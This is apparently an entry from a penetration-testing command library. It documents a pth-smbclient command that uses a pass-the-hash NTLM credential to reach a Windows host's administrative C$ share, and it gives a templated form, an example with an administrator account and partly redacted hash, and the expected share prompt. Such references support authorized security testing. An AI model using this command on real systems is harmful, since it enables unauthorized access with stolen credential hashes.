---
id: c773a849-efa1-4bf2-b8ff-1997cddc47a3
type: command
executor: bash
data: pth-smbclient -U "$_DOMAIN/$_USERNAME%$_NTLM_HASH" //$_TARGET_IP/C$
output: null
created_at: '2023-04-06T03:56:03.238276+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - smb
  - pth
verified: true
validated: true
---

# pth-smbclient-connect-to-admin-share

## Command

```bash
pth-smbclient -U "$_DOMAIN/$_USERNAME%$_NTLM_HASH" //$_TARGET_IP/C$
```

## Description

Connects to the administrative C$ share using pass-the-hash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -U | Auth credentials | Yes |
| //$_TARGET_IP/C$ | UNC to admin share | Yes |

## Examples

### Basic Usage

```bash
pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
```

## Expected Output

```
smb: \C$\>
```

## Related

- [[procedures/Open-Shares-Enumeration]]
- [[tools/Impacket]]
